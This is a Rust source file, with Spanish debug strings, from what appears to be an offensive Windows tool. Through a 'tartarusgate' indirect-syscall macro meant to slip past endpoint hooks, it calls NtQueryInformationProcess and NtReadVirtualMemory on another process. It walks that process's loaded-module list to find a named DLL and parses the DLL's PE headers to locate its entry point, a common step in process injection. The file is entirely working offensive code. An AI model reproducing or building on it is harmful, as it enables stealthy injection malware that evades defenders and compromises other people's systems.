use std::ffi::c_void;
use std::mem::offset_of;

use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::{PEB, PEB_LDR_DATA, PROCESS_BASIC_INFORMATION};
use windows::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
use windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;

use crate::common::utils::NULL;
use crate::{debug, tartarusgate};

pub fn searcher_address_dll(process_handle: HANDLE, dll_name: &str) -> Result<*mut c_void, Box<dyn std::error::Error>> {
    let mut pbi = PROCESS_BASIC_INFORMATION::default();
    let mut ret_len: usize = 0;

    unsafe {
        let status = tartarusgate!("NtQueryInformationProcess", process_handle.0 as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as usize, &mut ret_len as *mut _ as usize);
        debug!("Estado NtQueryInformationProcess: {:X}", status);

        let mut remote_peb: PEB = std::mem::zeroed();
        let mut read_bytes: usize = 0;
        let status = tartarusgate!("NtReadVirtualMemory", process_handle.0 as usize, pbi.PebBaseAddress, (&mut remote_peb as *mut PEB) as usize, std::mem::size_of::<PEB>(), &mut read_bytes as *mut _ as usize);
        debug!("Estado NtReadVirtualMemory: {status:X}");

        let mut remote_ldr: PEB_LDR_DATA = std::mem::zeroed();
        let mut read_bytes: usize = 0;
        let status = tartarusgate!("NtReadVirtualMemory", process_handle.0, remote_peb.Ldr as usize, &mut remote_ldr as *mut _ as usize, std::mem::size_of::<PEB_LDR_DATA>(), &mut read_bytes as *mut _ as usize);
        debug!("Estado NtReadVirtualMemory: {status:X}");

        let mut current = remote_ldr.InMemoryOrderModuleList.Flink;
        let head = remote_peb.Ldr as usize + offset_of!(PEB_LDR_DATA, InMemoryOrderModuleList);

        let mut count = 0;
        while current as usize != head {
            let entry_address = current as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            let mut entry = LDR_DATA_TABLE_ENTRY::default();

            let status = tartarusgate!("NtReadVirtualMemory", process_handle.0, entry_address, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), NULL);
            debug!("Estado de NtReadVirtualMemory: {:?}", status);

            if status == 0 {
                let mut name_buf = vec![0u16; (entry.FullDllName.Length / 2) as usize];
                let status = tartarusgate!("NtReadVirtualMemory", process_handle.0, entry.FullDllName.Buffer.0 as usize, name_buf.as_mut_ptr() as usize, entry.FullDllName.Length as usize, NULL);
                debug!("Estado NtReadVirtualMemory para DLL: {:?}", status);

                let name = String::from_utf16_lossy(&name_buf).rsplit('\\').next().unwrap_or("").to_lowercase();
                debug!("{name}");
                if name == dll_name.to_lowercase() {
                    debug!("Se encontro la DLL en el proceso");
                    return Ok(entry.DllBase);
                }
            } else {
                count += 1;
                debug!("{count}");
                if count >= 10 {
                    return Err("No se pudo seguir leyendo memoria".into())
                }
                continue
            }
            current = entry.InMemoryOrderLinks.Flink;
        }
    }

    Err("DLL no encontrada".into())
}

pub fn getremotedllentrypoint(process_handle: HANDLE, addr_dll: *mut c_void) -> Result<*mut c_void, Box<dyn std::error::Error>> {
    unsafe {
        let mut image_dos_header = IMAGE_DOS_HEADER::default();
        let size_dos_struct = std::mem::size_of::<IMAGE_DOS_HEADER>();
        let mut read_bytes = 0;

        let status = tartarusgate!("NtReadVirtualMemory", process_handle.0, addr_dll as usize, &mut image_dos_header as *mut _ as usize, size_dos_struct, &mut read_bytes as *mut _ as usize);
        debug!("Estado de NtReadVirtualMemory: {:?}", status);

        if read_bytes == size_dos_struct {
            if image_dos_header.e_magic != IMAGE_DOS_SIGNATURE.into() {
                return Err("DOS Header Invalido".into())
            }

            let mut ntheaders = IMAGE_NT_HEADERS64::default();
            let ntheader_size = std::mem::size_of::<IMAGE_NT_HEADERS64>();

            let status = tartarusgate!("NtReadVirtualMemory", process_handle.0, addr_dll.wrapping_add(image_dos_header.e_lfanew as usize) as usize, &mut ntheaders as *mut _ as *mut usize, ntheader_size as usize, &mut read_bytes as *mut _ as usize);
            debug!("Estado de NtReadVirtualMemory: {:?}", status);

            if ntheaders.Signature != IMAGE_NT_SIGNATURE.into() {
                return Err("NT Headers invalido".into());
            }

            return Ok(addr_dll.wrapping_add(ntheaders.OptionalHeader.AddressOfEntryPoint as usize))
        }
    }
    Err("No se pudo encontrar el entrypoint".into())
}
